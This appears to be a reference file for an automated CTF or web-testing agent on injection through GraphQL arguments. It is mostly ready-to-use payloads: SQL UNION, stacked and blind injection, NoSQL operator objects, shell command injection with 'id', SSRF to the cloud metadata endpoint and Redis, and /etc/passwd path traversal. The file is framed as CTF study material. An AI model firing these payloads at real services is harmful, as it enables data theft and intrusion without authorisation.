# Injection through GraphQL arguments

GraphQL validates the *shape* of an argument — `String`, `Int`, `ID` — and
nothing about what the resolver does with the value. Every argument is an
ordinary injection point into whatever the resolver touches: SQL, NoSQL,
shell, LDAP, template, path, ORM filter object, downstream HTTP service.

The GraphQL layer adds exactly two wrinkles: arguments arrive inside a typed
document (so quotes/escapes follow GraphQL string rules), and the response
shape is `data`/`errors` (so error oracles surface in the `errors` array —
often with raw driver text).

Route the underlying bug to its own skill once identified:
`skills/web-sqli/`, `skills/web-nosqli/`, `skills/web-command-injection/`,
`skills/web-ssti/`, `skills/web-ssrf/`, `skills/file-read-primitives/` — the
field is just the carrier. This file covers the carrier: how to find which
arguments are injectable, how the escaping works, and how the result comes
back.

---

## 1. Injection points, ranked

1. **String/ID arguments to read resolvers** — `user(id:)`, `post(name:)`,
   `search(q:)`, `filter(login:)`, `node(id:)`. These feed WHERE clauses.
2. **Input-object fields** — `filter: {login: "x", email: "y"}` gets
   concatenated per-field into one WHERE (see §3).
3. **Mutation arguments** — `register(username:, password:)`,
   `updateProfile(bio:)`. Inserts/updates are injectable identically; the
   write primitive adds stored-XSS and mass-assignment surfaces
   (`mutation-abuse.md`).
4. **Enum/custom-scalar values** — `sortBy`, `order`, `direction` reach raw
   `ORDER BY` clauses (unparametrizable — always concatenated). JSON scalars
   (`filter: JSON`) smuggle operator objects → NoSQLi.
5. **Pagination args** — `first`, `after`, `offset`, `limit`: numeric that
   reach LIMIT/OFFSET clauses or range comparisons.
6. **File/path arguments** — `file(name:)`, `download(path:)`,
   `import(path:)` → `file-read-primitives`.
7. **URL arguments** — `avatar(url:)`, `webhook(url:)`, `import(url:)`,
   `proxy(url:)` → `skills/web-ssrf/`.
8. **Directive arguments** — `@include(if:)` and custom directives with
   server-side effects (`directives-deep.md`).

## 2. GraphQL string escaping — how quotes travel

Inside the document, a string argument is a JSON-ish quoted value. The
payload's quote must survive two layers: GraphQL string parsing, then SQL.

```graphql
# the apostrophe goes through raw — GraphQL strings use double quotes
{ user(name: "o'connor") { id } }

# escape inside a GraphQL string with backslash
{ user(name: "say \"hi\"") }

# block string — no escaping needed at all, triple-quoted
{ user(name: """ o'connor " ' \ any literal """) { id } }
```

So a classic `'` probe is just:

```json
{"query":"{ user(name: \"' \") { id } }"}
```

JSON-escape the outer double quotes in the request body; the inner `'`
reaches SQL untouched.

**The backslash trick** (VolgaCTF Library — verbatim from the writeup corpus):
when a filter object sanitizes each field but concatenates them into one
WHERE, end the sanitized field with a backslash so it escapes the field's own
closing quote — the sibling field then parses as SQL:

```graphql
{ testGetUsersByFilter(filter: {login: "\\" email: " OR 1=1 -- "}) { login } }
# → SELECT * FROM users WHERE login='\' OR email=' OR 1=1 -- '
```

The first field's `\'` neutralizes its terminator; `email`'s value becomes
live SQL. This only needs *one* field filtered and one field not — check
every sibling pair in every input object.

## 3. Input objects — per-field binding analysis

`filter: {login, email, age}` may compile to:

- `WHERE login=? AND email=?` (bound separately — safe), or
- `WHERE login='L' AND email='E'` (concatenated — the §2 attack), or
- an ORM `find({login, email})` (object → NoSQLi, `skills/web-nosqli/`).

Discriminate with three probes:

```graphql
{ f(filter:{login:"'"}) }              # quote — stripped? error? 
{ f(filter:{login:"\\" email:"x"}) }   # backslash terminator
{ f(filter:{login:{"$ne":null}}) }     # object value → NoSQLi tell
```

## 4. SQL through GraphQL — the working set

Once a string arg reaches SQL (`{getNote(q:"test'")}` →
`sqlite3.OperationalError` in `errors[].message` — verbatim signal from the
corpus), all of `skills/web-sqli/references/` applies. The GraphQL-specific
moves:

```graphql
# UNION through the same field — column count by ORDER BY / UNION n,n,n
{ getNote(q:"' UNION SELECT 1,2,3-- ") { body } }

# sqlite schema pull (the corpus's proven shape)
{ getNote(q:"' UNION SELECT tbl_name,null,null,null FROM sqlite_master
             WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'-- ") { body } }
{ getNote(q:"' UNION SELECT sql,null,null,null FROM sqlite_master-- ") { body } }

# mysql
{ user(name:"' UNION SELECT table_name,column_name FROM
          information_schema.columns-- ") { id } }

# stacked queries where the driver allows (mysqli multi, pg simple)
{ getNote(q:"'; INSERT INTO notes(body) VALUES('x')-- ") { body } }

# error-based when UNION fails — driver text lands in errors[].message
{ getNote(q:"' AND extractvalue(1,concat(0x7e,(SELECT secret)))-- ") { body } }

# blind boolean — data-field presence as oracle
{ getNote(q:"x' AND substr((SELECT flag FROM flags),1,1)='a'-- ") { body } }
```

Result-column mapping trick: the UNION's `SELECT` list position matches the
resolver's selected columns — align types (`int,string,...`) by reading the
original field's return shape.

## 5. NoSQL through GraphQL — the carrier difference

When the resolver does `collection.find(arg)` or `find({field: arg})`, inject
*objects* — GraphQL input objects map 1:1 to Mongo filters:

```graphql
# arg typed as JSON scalar / input object — operator injection
{ user(login: {name: "admin", password: {"$ne": null}}) { id } }
{ users(filter: {role: {"$regex": ".*"}}) { name } }

# variable-path injection — the object travels via variables JSON
{"query":"query($f:JSON){ users(filter:$f){name} }",
 "variables":{"f":{"password":{"$ne":null}}}}
```

The `variables` channel bypasses GraphQL string parsing entirely — the object
is parsed as raw JSON into the resolver. Any arg typed as a custom JSON/JSONB
scalar accepts it. Details: `skills/web-nosqli/references/carrier-json-deep.md`.

## 6. Command/template injection

```graphql
{ render(template: "{{7*7}}") }                          # SSTI marker
{ ping(host: "127.0.0.1; id") }                          # cmdi
{ convert(format: "x'\";id;#'") }
{ generateReport(name: "`id`") }
{ export(format: "csv", delim: "|`id`#") }
```

Confirm markers land inside `data` (rendered) or `errors` (driver text). Then
route to the carrier skill — `skills/web-command-injection/references/` for
the extraction payloads.

## 7. SSRF and file-read via arguments

```graphql
{ fetchAvatar(url: "http://169.254.169.254/latest/meta-data/") }
{ importData(url: "file:///etc/passwd") }
{ proxy(target: "gopher://127.0.0.1:6379/_INFO") }
{ readFile(path: "../../../etc/passwd") }
{ download(file: "....//....//flag") }
```

A resolver that fetches is SSRF — the URL arg is the whole attack. A resolver
that reads is LFI. Route to `skills/web-ssrf/` and
`skills/file-read-primitives/` respectively.

## 8. Variables channel vs inline arguments

Two carriers for the same value:

```json
{"query":"query($n:String){ user(name:$n){id} }",
 "variables":{"n":"x' OR '1'='1"}}
```

- Inline `name:"x' OR '1'='1"` — passes GraphQL string parsing (escapes apply).
- Variable `$n` — the value is raw JSON in `variables`, bypasses the document
  parser. Escapes don't apply; objects injectable.

Test both — some sanitizers inspect only the document text, not resolved
variables; others normalize variables but not inline. The `variables` route
also carries type-confused values (`type-confusion.md`).

## 9. Errors as the oracle — where injection evidence lands

GraphQL wraps resolver exceptions into `errors[]`. What each shape means:

| errors[].message contains | Verdict |
|---|---|
| `sqlite3.OperationalError`, `SQL syntax`, `mysql`, `psql`, `ORA-` | SQL reachable — sqli class live |
| `MongoError`, `BSON`, `$where`, `Cast to ObjectId failed` | NoSQL live |
| `ENOENT`, `no such file`, `Is a directory` | file-read primitive |
| `ECONNREFUSED`, `ENOTFOUND`, `getaddrinfo` | SSRF-ish fetcher — probe further |
| `command not found`, `sh:`, `cmd.exe` | cmdi |
| `ValidationError`, `Cast to` | typed arg — type-confusion candidate |
| generic `Internal server error` + `extensions.code` | suppressed — switch to blind |

Record the driver text verbatim — it is `post-probe --evidence` gold:

```bash
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /graphql {getNote(q:"test"+char(39))}' \
  --verdict confirms --evidence-kind class --class web-sqli \
  --hypothesis-id h2 --evidence 'sqlite3.OperationalError: unrecognized' \
  --response '<verbatim errors array>'
```

A SQL error inside a GraphQL response reclassifies the bug class to
`web-sqli` for the ledger — record `state.py --bug-class web-sqli` while
keeping the GraphQL carrier note. The class skill that *owns the sink* owns
the finding; this skill owns the carrier.

## 10. Order of work

1. Map the schema (introspection or recovery) → list every field taking
   String/ID/JSON/input-object args.
2. Per arg, send the `'` probe — read `errors[].message` for driver text.
3. Where silent, send the type-confused value (`type-confusion.md`).
4. Where the errors array always comes back generic, switch to blind —
   `blind-graphql.md`.
5. Route confirmed classes to their owner skills; keep this skill for the
   GraphQL-specific mechanics (batching to beat rate limits on blind loops —
   `batching-attacks.md`).
